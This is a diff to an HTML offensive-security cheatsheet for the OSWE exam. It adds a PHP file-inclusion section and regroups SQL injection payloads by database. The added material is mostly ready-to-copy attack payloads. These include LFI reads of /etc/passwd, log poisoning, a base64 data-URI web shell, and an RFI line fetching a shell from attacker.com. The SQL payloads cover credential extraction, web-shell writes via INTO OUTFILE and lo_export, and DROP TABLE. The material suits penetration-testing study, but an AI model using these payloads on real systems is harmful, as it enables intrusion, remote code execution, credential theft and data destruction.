@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OSWE Cheatsheet</title>
+    <title>Extravenger's OSWE Cheatsheet</title>
     <!-- Highlight.js for syntax highlighting -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/monokai.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
@@ -809,13 +809,19 @@
                     </li>
                 </ul>
             </li>
-            <li><a href="#regex-cheatsheet">5. Regex Cheatsheet</a>
+            <li><a href="#file-inclusion-vulnerabilities-in-php">5. File Inclusion Vulnerabilities in PHP</a>
+                <ul>
+                    <li><a href="#local-file-inclusion-lfi">Local File Inclusion (LFI)</a></li>
+                    <li><a href="#remote-file-inclusion-rfi">Remote File Inclusion (RFI)</a></li>
+                </ul>
+            </li>
+            <li><a href="#regex-cheatsheet">6. Regex Cheatsheet</a>
                 <ul>
                     <li><a href="#match-a-start-and-end-delimiter-in-rtext">Match a START and END Delimiter in r.text</a></li>
                     <li><a href="#extract-a-cookie-value-from-response-headers">Extract a Cookie Value from Response Headers</a></li>
                 </ul>
             </li>
-            <li><a href="#xss-payloads">6. XSS Payloads</a>
+            <li><a href="#xss-payloads">7. XSS Payloads</a>
                 <ul>
                     <li><a href="#load-external-javascript">Load External JavaScript</a></li>
                     <li><a href="#load-inline-javascript">Load Inline JavaScript</a></li>
@@ -825,13 +831,14 @@
                     <li><a href="#send-request-to-specific-endpoint-with-custom-header-and-send-response-back">Send Request to Specific Endpoint with Custom Header and Send Response Back</a></li>
                 </ul>
             </li>
-            <li><a href="#sql-injection-payloads-and-postgres-cheatsheet">7. SQL Injection Payloads and Postgres Cheatsheet</a>
+            <li><a href="#sql-injection-cheatsheet">8. SQL Injection Cheatsheet</a>
                 <ul>
-                    <li><a href="#sql-injection-payloads">SQL Injection Payloads</a></li>
-                    <li><a href="#basic-postgres-commands">Basic Postgres Commands</a></li>
+                    <li><a href="#general-sql-injection-payloads">General SQL Injection Payloads</a></li>
+                    <li><a href="#postgres-specific">Postgres Specific</a></li>
+                    <li><a href="#mysql-specific">MySQL Specific</a></li>
                 </ul>
             </li>
-            <li><a href="#javascript-code-snippets">8. JavaScript Code Snippets</a>
+            <li><a href="#javascript-code-snippets">9. JavaScript Code Snippets</a>
                 <ul>
                     <li><a href="#basic-fetch-request">Basic Fetch Request</a></li>
                     <li><a href="#fetch-with-headers-and-body">Fetch with Headers and Body</a></li>
@@ -839,16 +846,16 @@
                     <li><a href="#websocket-client-1">WebSocket Client</a></li>
                 </ul>
             </li>
-            <li><a href="#bypass-php-eval-filtering">9. Bypass PHP Eval Filtering</a></li>
-            <li><a href="#bypass-javascript-injection-filters">10. Bypass Javascript Injection Filters</a></li>
-            <li><a href="#ysoserial-payload-creation">11. YSOSerial Payload Creation</a>
+            <li><a href="#bypass-php-eval-filtering">10. Bypass PHP Eval Filtering</a></li>
+            <li><a href="#bypass-javascript-injection-filters">11. Bypass Javascript Injection Filters</a></li>
+            <li><a href="#ysoserial-payload-creation">12. YSOSerial Payload Creation</a>
                 <ul>
                     <li><a href="#net-version">.NET Version</a></li>
                     <li><a href="#java-version">JAVA Version</a></li>
                 </ul>
             </li>
-            <li><a href="#report-recommendations">12. Report Recommendations</a></li>
-            <li><a href="#additional-resources">13. Additional Resources</a></li>
+            <li><a href="#report-recommendations">13. Report Recommendations</a></li>
+            <li><a href="#additional-resources">14. Additional Resources</a></li>
         </ul>
     </aside>
 
@@ -1679,6 +1686,47 @@ if __name__ == "__main__":
             <button class="copy-btn">Copy</button>
         </div>
 
+        <h2 id="file-inclusion-vulnerabilities-in-php">File Inclusion Vulnerabilities in PHP</h2>
+
+        <h3 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h3>
+        <p>LFI occurs when an application includes files based on user input without proper validation or sanitization. This can allow attackers to read sensitive local files.</p>
+        <p>Common vulnerable code:</p>
+        <div class="code-container">
+            <pre><code class="language-php">include($_GET['page'] . '.php');</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <p>Configurations that enable/exacerbate LFI:</p>
+        <ul>
+            <li>No specific php.ini setting required, but open_basedir can restrict directories.</li>
+            <li>If open_basedir is not set, attackers can traverse directories using ../</li>
+        </ul>
+        <p>Abuse strategies:</p>
+        <ul>
+            <li>Read sensitive files: ?page=../../../etc/passwd</li>
+            <li>Use wrappers for code execution: ?page=php://filter/convert.base64-encode/resource=../../config.php (to read encoded source)</li>
+            <li>Log poisoning: Inject PHP code into logs (e.g., via User-Agent) and include the log file: ?page=/var/log/apache2/access.log</li>
+            <li>Data URI for RCE if allow_url_include=On: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+</li>
+        </ul>
+
+        <h3 id="remote-file-inclusion-rfi">Remote File Inclusion (RFI)</h3>
+        <p>RFI allows inclusion of remote files, leading to remote code execution if the included file contains malicious code.</p>
+        <p>Common vulnerable code:</p>
+        <div class="code-container">
+            <pre><code class="language-php">include($_GET['page']);</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <p>Configurations that enable RFI:</p>
+        <ul>
+            <li>allow_url_fopen=On (default, allows remote file access)</li>
+            <li>allow_url_include=On (allows include/require of remote files)</li>
+        </ul>
+        <p>Abuse strategies:</p>
+        <ul>
+            <li>Include remote shell: ?page=http://attacker.com/shell.txt (where shell.txt contains <?php system($_GET['cmd']); ?>)</li>
+            <li>Bypass filters: Use null byte %00 if PHP < 5.3: ?page=http://attacker.com/shell.txt%00</li>
+            <li>Combine with LFI for advanced attacks.</li>
+        </ul>
+
         <h2 id="regex-cheatsheet">Regex Cheatsheet</h2>
 
         <h3 id="match-a-start-and-end-delimiter-in-rtext">Match a START and END Delimiter in r.text</h3>
@@ -1836,9 +1884,9 @@ req2.send();
             <button class="copy-btn">Copy</button>
         </div>
 
-        <h2 id="sql-injection-payloads-and-postgres-cheatsheet">SQL Injection Payloads and Postgres Cheatsheet</h2>
+        <h2 id="sql-injection-cheatsheet">SQL Injection Cheatsheet</h2>
 
-        <h3 id="sql-injection-payloads">SQL Injection Payloads</h3>
+        <h3 id="general-sql-injection-payloads">General SQL Injection Payloads</h3>
         <div class="code-container">
             <pre><code class="language-sql">' UNION SELECT 1,2,3 -- -</code></pre>
             <button class="copy-btn">Copy</button>
@@ -1856,19 +1904,18 @@ req2.send();
             <button class="copy-btn">Copy</button>
         </div>
         <div class="code-container">
+            <pre><code class="language-sql">'; DROP TABLE users; -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+
+        <h3 id="postgres-specific">Postgres Specific</h3>
+        <p>Postgres SQL Injection Payloads:</p>
+        <div class="code-container">
             <pre><code class="language-sql">' AND (SELECT pg_sleep(5)) -- -</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
         <div class="code-container">
-            <pre><code class="language-sql">' AND SLEEP(5) -- -</code></pre>
-            <button class="copy-btn">Copy</button>
-        </div>
-        <div class="code-container">
             <pre><code class="language-sql">' UNION SELECT version() -- -</code></pre>
-            <button class="copy-btn">Copy</button>
-        </div>
-        <div class="code-container">
-            <pre><code class="language-sql">' UNION SELECT @@version -- -</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
         <div class="code-container">
@@ -1884,27 +1931,11 @@ req2.send();
             <button class="copy-btn">Copy</button>
         </div>
         <div class="code-container">
-            <pre><code class="language-sql">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() -- -</code></pre>
-            <button class="copy-btn">Copy</button>
-        </div>
-        <div class="code-container">
-            <pre><code class="language-sql">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -</code></pre>
-            <button class="copy-btn">Copy</button>
-        </div>
-        <div class="code-container">
             <pre><code class="language-sql">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
         <div class="code-container">
             <pre><code class="language-sql">' UNION SELECT username,password FROM users -- -</code></pre>
-            <button class="copy-btn">Copy</button>
-        </div>
-        <div class="code-container">
-            <pre><code class="language-sql">' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/html/shell.php' -- -</code></pre>
-            <button class="copy-btn">Copy</button>
-        </div>
-        <div class="code-container">
-            <pre><code class="language-sql">' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO DUMPFILE '/var/www/html/shell.php' -- -</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
         <div class="code-container">
@@ -1915,17 +1946,7 @@ req2.send();
             <pre><code class="language-sql">' UNION SELECT lo_export(lo_create('\x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e'), '/var/www/html/shell.php') -- -</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-        <div class="code-container">
-            <pre><code class="language-sql">INSERT INTO users (id, name) VALUES (1, 'test') INTO OUTFILE '/tmp/test.txt' -- -</code></pre>
-            <button class="copy-btn">Copy</button>
-        </div>
-        <p>Use comments like <code>/*comment*/</code>, case variations, or encodings like <code>UN/**/ION SEL/**/ECT</code>.</p>
-        <div class="code-container">
-            <pre><code class="language-sql">'; DROP TABLE users; -- -</code></pre>
-            <button class="copy-btn">Copy</button>
-        </div>
-
-        <h3 id="basic-postgres-commands">Basic Postgres Commands</h3>
+        <p>Basic Postgres Commands:</p>
         <div class="code-container">
             <pre><code class="language-sql">SELECT datname FROM pg_database;</code></pre>
             <button class="copy-btn">Copy</button>
@@ -1994,6 +2015,67 @@ req2.send();
             <pre><code class="language-sql">SELECT current_database();</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
+        <p>Postgres Database Shortcuts (psql meta-commands):</p>
+        <div class="code-container">
+            <pre><code class="language-bash">\l - List all databases</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">\c database_name - Connect to a database</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">\dt - List all tables in the current database</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">\d table_name - Describe a table (columns, types, etc.)</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">\du - List all users and roles</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">\dn - List all schemas</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">\q - Quit psql</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+
+        <h3 id="mysql-specific">MySQL Specific</h3>
+        <p>MySQL SQL Injection Payloads:</p>
+        <div class="code-container">
+            <pre><code class="language-sql">' AND SLEEP(5) -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT @@version -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/html/shell.php' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO DUMPFILE '/var/www/html/shell.php' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">INSERT INTO users (id, name) VALUES (1, 'test') INTO OUTFILE '/tmp/test.txt' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <p>Use comments like <code>/*comment*/</code>, case variations, or encodings like <code>UN/**/ION SEL/**/ECT</code>.</p>
 
         <h2 id="javascript-code-snippets">JavaScript Code Snippets</h2>
 
